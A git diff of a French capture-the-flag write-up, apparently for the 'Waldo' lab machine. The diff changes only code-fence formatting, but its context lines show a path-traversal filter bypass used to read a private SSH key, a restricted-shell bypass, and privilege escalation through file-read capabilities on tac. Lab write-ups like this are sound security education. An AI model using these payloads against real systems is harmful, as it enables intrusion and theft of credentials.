@@ -22,7 +22,7 @@ Le plus pratique est d'intercepter la requête à travers [Zed Attack Proxy](htt
 
 On remarque vite une particularité si on tente de remonter dans le path :  
 
-```plain
+```
 path= => [".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
 path=. => [".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
 path=.. => [".","..","html","localhost"]
@@ -34,14 +34,14 @@ Au boût d'un moment on revient au répertoire courant, il y a donc un *str\_rep
 
 Si on part de l'idée que le filtre est sur ../../ alors on peut le précéder de .. et ajouter un / final ainsi la suite de caractères ..../..// correspondra à une remontée dans l’arborescence :  
 
-```plain
+```
 path=..../..//..../..// => [".","..","cache","empty","lib","local","lock","log","opt","run","spool","tmp","www"]
 path=..../..//..../..//..../..// => [".","..",".dockerenv","bin","dev","etc","home","lib","media","mnt","proc","root","run","sbin","srv","sys","tmp","usr","var"]
 ```
 
 On se balade jusqu'à ce dossier :  
 
-```plain
+```
 path=..../..//..../..//..../..//home/nobody
 [".","..",".ash_history",".ssh",".viminfo","l.sh","user.txt"]
 ```
@@ -50,7 +50,7 @@ Et dans le dossier *.ssh* on voit un fichier *.monitor* qui s'avère être... la
 
 Pour obtenir le contenu la même faille est présente sur l'autre script ce qui nous amène à cette requête :  
 
-```plain
+```
 POST http://10.10.10.87/fileRead.php HTTP/1.1
 file=..../..//..../..//..../..//home/nobody/.ssh/.monitor
 ```
@@ -58,7 +58,7 @@ file=..../..//..../..//..../..//home/nobody/.ssh/.monitor
 Free Charlie
 ------------
 
-```plain
+```
 $ ssh -i waldo.key nobody@10.10.10.87
 Welcome to Alpine!
 
@@ -73,7 +73,7 @@ Hmmm Charlie semble être enfermé dans un environnement *Docker* (*Alpine* est 
 
 Cela est très vite confirmé avec les interfaces réseau :  
 
-```plain
+```
 docker0   Link encap:Ethernet  HWaddr 02:42:D3:28:1C:FD
           inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
           UP BROADCAST MULTICAST  MTU:1500  Metric:1
@@ -90,7 +90,7 @@ Prends la clé ! Sors sors !
 
 Dans la liste des *authorized\_keys* de notre compte *nobody* se trouve une référence à un certain *monitor* :  
 
-```plain
+```
 ssh-rsa AAAAB3NzaC1---snip---Y4jBHvf monitor@waldo
 ```
 
@@ -102,7 +102,7 @@ On peut facilement bypasser le lancement du rbash (un bash restreint) en spécif
 
 On obtient un shell à première vue limitée mais il s'agit en réalité du PATH peu remplis, ce qui est vite corrigé :  
 
-```plain
+```
 monitor@waldo:~$ echo $PATH
 /home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
 monitor@waldo:~$ export PATH=/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin:$PATH
@@ -115,7 +115,7 @@ Après avoir tourné un moment à chercher un chemin classique d'exploitation il
 
 On trouve un exécutable *logMonitor* à l'usage suivant :  
 
-```plain
+```
 Usage: logMonitor [-aAbdDfhklmsw] [--help]
 ```
 
@@ -148,7 +148,7 @@ En revanche une fois dans le sous dossier *v0.1* le binaire *logMonitor-0.1* par
 
 On fait un *getcap* dessus pour lister ses [capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html) et surprise :  
 
-```plain
+```
 logMonitor-0.1 = cap_dac_read_search+ei
 ```
 
@@ -158,7 +158,7 @@ Mais après avoir bien épluché le code C ce dernier ne semble pas faillible. J
 
 Finalement il fallait faire un gros *getcap* sur le disque pour trouver un autre binaire avec les même super-pouvoirs :  
 
-```plain
+```
 monitor@waldo:~/app-dev$ getcap -r / 2> /dev/null
 /usr/bin/tac = cap_dac_read_search+ei
 /home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
